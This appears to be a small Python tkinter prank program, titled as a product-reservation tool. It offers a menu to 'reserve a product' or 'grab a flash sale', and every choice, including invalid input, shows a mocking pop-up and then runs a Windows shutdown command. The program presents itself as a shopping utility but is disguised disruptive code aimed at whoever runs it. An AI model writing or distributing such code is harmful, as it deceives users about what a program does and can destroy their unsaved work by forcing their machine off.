#!/usr/bin/python3
# -*- coding:utf-8 -*-
# @Time         :       2021/8/30 15:07
# @Author       :       林子然
# @File         :       04 预约商品.py
# @Software     :       Pycharm
import os
import tkinter as tk
from tkinter import messagebox

root = tk.Tk()

a = '''\
1、预约商品
2、秒杀抢购商品

请选择：
'''
def choose():
    if input_entry.get() == '1':
        messagebox.showwarning('不好意思', '没预约到，接下来将对您的电脑进行关机')
        os.system('shutdown -s')

    elif input_entry.get() == '2':
        messagebox.showwarning('哈哈', '想得美')
        os.system('shutdown -s')

    else:
        messagebox.showwarning('Error!', '输入无效')
        os.system('shutdown -s')

tk.Label(root, text=a).pack()
input_entry = tk.Entry(root)
input_entry.pack()

tk.Button(root, text='提交', command=choose).pack()
root.mainloop()


